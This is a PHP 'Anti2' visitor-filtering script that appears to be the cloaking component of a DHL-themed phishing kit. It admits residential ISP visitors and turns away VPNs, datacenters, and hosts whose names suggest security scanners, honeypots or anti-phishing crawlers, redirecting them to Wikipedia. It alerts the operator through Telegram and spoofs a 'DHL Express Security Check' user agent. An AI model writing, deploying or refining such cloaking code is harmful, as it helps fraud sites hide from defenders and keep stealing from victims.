<?php
// Anti2: Improved IP Verification
// Blocks obvious hosting providers and datacenter IPs while allowing some VPNs

// No bypass system - full protection active

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

$client_ip = $_SERVER['REMOTE_ADDR'] ?? '';
$hostname = gethostbyaddr($client_ip);

// Smart IP filtering - comprehensive whitelist approach
$trusted_isps = [
    // Major ISPs worldwide
    'comcast', 'verizon', 'att.net', 'charter', 'cox.net', 'centurylink', 'spectrum',
    'orange', 'bt.com', 'virgin', 'sky.com', 'telstra', 'rogers', 'bell.ca',
    'vodafone', 'o2.co.uk', 'three.co.uk', 'ee.co.uk', 'plusnet',
    'deutsche-telekom', 'telefonica', 'tim.it', 'swisscom', 'kpn.com',
    'telenor', 'telia', 'elisa', 'dna.fi', 'proximus.be',
    
    // Communication and telecom providers
    'telroaming', 'advanced communication', 'communication solution',
    'telecom', 'communications', 'network', 'internet',
    
    // European ISPs and telecom
    'ziggo', 'xs4all', 'caiway', 'freedom', 'delta', 'online.nl',
    'xs4all.nl', 'planet.nl', 'hetnet.nl', 'speedxs.nl',
    
    // VPN services - REMOVED from trusted list (now blocked)
    // 'expressvpn', 'nordvpn', 'surfshark', 'cyberghost', 'purevpn',
    // 'ipvanish', 'tunnelbear', 'windscribe', 'protonvpn',
    
    // Mobile carriers
    'tmobile', 't-mobile', 'sprint', 'metropolitan', 'boost',
    'cricket', 'mint-mobile', 'straight-talk', 'total-wireless',
    
    // International carriers
    'vodacom', 'mtn', 'cell c', 'telkom', 'airtel', 'jio',
    'idea', 'bsnl', 'reliance', 'tata', 'singtel', 'starhub'
];

$is_trusted_isp = false;
foreach ($trusted_isps as $isp) {
    if (stripos($hostname, $isp) !== false) {
        $is_trusted_isp = true;
        break;
    }
}

// If from trusted ISP, allow completely
if ($is_trusted_isp) {
    return; // Allow all trusted ISPs
}

// Additional check for legitimate users - if has good browser indicators, be more lenient
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$browser_legitimacy = 0;

// Check for legitimate browser patterns
$legit_patterns = ['Chrome/', 'Firefox/', 'Safari/', 'Edge/', 'Mozilla/', 'WebKit/'];
foreach ($legit_patterns as $pattern) {
    if (stripos($user_agent, $pattern) !== false) $browser_legitimacy++;
}

// Check for OS patterns
$os_patterns = ['Windows NT', 'Mac OS X', 'Macintosh', 'Linux', 'Android', 'iPhone'];
foreach ($os_patterns as $pattern) {
    if (stripos($user_agent, $pattern) !== false) $browser_legitimacy++;
}

// Universal ISP intelligence - if browser looks legitimate, be very lenient
if ($browser_legitimacy >= 2) {
    // Only block if hostname contains obvious threat indicators
    $threat_indicators = ['tor-exit', 'proxy', 'bot', 'crawler', 'malware', 'abuse', 'spam', 'phish', 'honeypot'];
    $has_threat = false;
    foreach ($threat_indicators as $threat) {
        if (stripos($hostname, $threat) !== false) {
            $has_threat = true;
            break;
        }
    }
    
    if (!$has_threat) {
        error_log("Allowing legitimate browser from ISP: {$hostname} ({$client_ip}) UA: {$user_agent}");
        return; // Allow ALL legitimate browsers from clean ISPs
    }
}

// Additional intelligence: Check for common ISP/telecom keywords
$isp_keywords = [
    'telecom', 'communications', 'internet', 'broadband', 'cable', 'fiber',
    'wireless', 'mobile', 'cellular', 'network', 'connect', 'online',
    'provider', 'service', 'solutions', 'technologies', 'systems'
];

$looks_like_isp = false;
foreach ($isp_keywords as $keyword) {
    if (stripos($hostname, $keyword) !== false) {
        $looks_like_isp = true;
        break;
    }
}

// If it looks like a legitimate ISP/telecom and user has good browser, allow
if ($looks_like_isp && $browser_legitimacy >= 1) {
    error_log("Allowing ISP/telecom provider: {$hostname} ({$client_ip}) UA: {$user_agent}");
    return;
}

// Block VPN, Proxy and suspicious hosting
$suspicious_hosts = [
    // VPN and Proxy services - ALL BLOCKED
    'vpn', 'proxy', 'proxies', 'anonymizer', 'tor-exit', 'tor',
    'expressvpn', 'nordvpn', 'surfshark', 'cyberghost', 'purevpn',
    'ipvanish', 'tunnelbear', 'windscribe', 'protonvpn', 'privatevpn',
    'mullvad', 'hidemyass', 'hotspotshield', 'vyprvpn', 'strongvpn',
    'privateinternetaccess', 'pia-servers', 'perfectprivacy',
    'airvpn', 'anonine', 'blackvpn', 'bolehvpn', 'boxpn',
    'cryptostorm', 'faceless', 'froot', 'goldenfrog', 'hide.me',
    'ibvpn', 'invisible-browsing', 'ironsocket', 'kepard',
    'limelight', 'ovpn', 'privatetunnel', 'slickvpn', 'torguard',
    'totalvpn', 'trust.zone', 'tunnelbear', 'vpnarea', 'vpnbook',
    'vpngate', 'vpnhub', 'vpnme', 'vpnsecure', 'vpntunnel',
    'witopia', 'zenmate', 'zoogvpn',
    
    // Proxy services
    'hidemyass', 'anonymouse', 'kproxy', 'proxify', 'guardster',
    'megaproxy', 'ninjacloak', 'proxybrowse', 'proxysite',
    'quickproxy', 'samair', 'spys', 'sslproxy', 'webproxy',
    'anonymizer', 'anonymous', 'hide-ip', 'proxy-list',
    
    // Bot/attack sources
    'bot', 'crawler', 'spider', 'scan', 'abuse', 'blackhole',
    'cyveillance', 'fail2ban', 'honeypot', 'security', 'malware', 'phish',
    
    // Suspicious cloud providers and hosting
    'choopa', 'psychz', 'quadranet', 'colocrossing', 'sharktech',
    'privatelayer', 'nocix', 'hostkey', 'nforce', 'leaseweb',
    'servermania', 'wholesale', 'datacamp', 'fdcservers',
    'hosthatch', 'alexhost', 'blazingfast', 'serverel',
    
    // Anonymous hosting
    'bulletproof', 'offshore', 'anonymous', 'privacy', 'secure'
];

foreach ($suspicious_hosts as $host) {
    if (stripos($hostname, $host) !== false) {
        require_once __DIR__ . '/telegram_notify.php';
        notifyBotBlocked($client_ip, $_SERVER['HTTP_USER_AGENT'] ?? 'unknown', "Suspicious hosting provider", ['hostname' => $hostname, 'pattern' => $host]);
        
        error_log("Blocked suspicious host: {$hostname} ({$client_ip})");
        header('HTTP/1.1 403 Forbidden');
        header('Location: https://www.wikipedia.org');
        exit();
    }
}

// Smart datacenter detection - only block obvious bot farms
$datacenter_patterns = [
    // Only very obvious datacenter patterns
    'compute.amazonaws.com', 'googleusercontent.com', 'compute.internal',
    'cloud.scaleway.com', 'novalocal', 'openstacklocal'
];

foreach ($datacenter_patterns as $pattern) {
    if (stripos($hostname, $pattern) !== false) {
        // Don't block immediately - check for additional suspicious signs
        $suspicious_score = 0;
        
        // Check user agent for bot patterns
        $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
        if (empty($user_agent) || strlen($user_agent) < 20) $suspicious_score += 2;
        if (stripos($user_agent, 'bot') !== false) $suspicious_score += 3;
        if (stripos($user_agent, 'curl') !== false) $suspicious_score += 3;
        
        // Only block if datacenter + suspicious behavior
        if ($suspicious_score >= 3) {
            require_once __DIR__ . '/telegram_notify.php';
            notifyBotBlocked($client_ip, $user_agent, "Datacenter with suspicious behavior", ['hostname' => $hostname, 'suspicious_score' => $suspicious_score]);
            
            error_log("Blocked datacenter with suspicious behavior: {$hostname} ({$client_ip}) UA: {$user_agent}");
            header('HTTP/1.1 403 Forbidden');
            header('Location: https://www.wikipedia.org');
            exit();
        }
    }
}

// Advanced VPN/Proxy Detection using external APIs
function checkVPNProxy($ip) {
    $vpn_apis = [
        // Free VPN detection APIs
        "https://ipqualityscore.com/api/json/ip/free/{$ip}",
        "https://vpnapi.io/api/{$ip}?key=free",
        "http://ip-api.com/json/{$ip}?fields=proxy,hosting"
    ];
    
    foreach ($vpn_apis as $api_url) {
        try {
            $context = stream_context_create([
                'http' => [
                    'timeout' => 3,
                    'user_agent' => 'Mozilla/5.0 (compatible; DHL Express Security Check)'
                ]
            ]);
            
            $response = @file_get_contents($api_url, false, $context);
            if ($response) {
                $data = json_decode($response, true);
                
                if ($data) {
                    // Check for VPN/proxy indicators
                    if (isset($data['proxy']) && $data['proxy'] === true) return true;
                    if (isset($data['vpn']) && $data['vpn'] === true) return true;
                    if (isset($data['tor']) && $data['tor'] === true) return true;
                    if (isset($data['hosting']) && $data['hosting'] === true) return true;
                    if (isset($data['is_proxy']) && $data['is_proxy'] === true) return true;
                    if (isset($data['is_vpn']) && $data['is_vpn'] === true) return true;
                    
                    // Check fraud score (high score = likely VPN/proxy)
                    if (isset($data['fraud_score']) && $data['fraud_score'] > 75) return true;
                }
            }
        } catch (Exception $e) {
            // Continue to next API if one fails
            continue;
        }
    }
    
    return false;
}

// Check IP for VPN/Proxy usage
if (checkVPNProxy($client_ip)) {
    require_once __DIR__ . '/telegram_notify.php';
    notifyBotBlocked($client_ip, $user_agent, "VPN/Proxy detected via API", ['hostname' => $hostname]);
    
    error_log("Blocked VPN/Proxy user: {$hostname} ({$client_ip}) UA: {$user_agent}");
    header('HTTP/1.1 403 Forbidden');
    header('Location: https://www.wikipedia.org');
    exit();
}
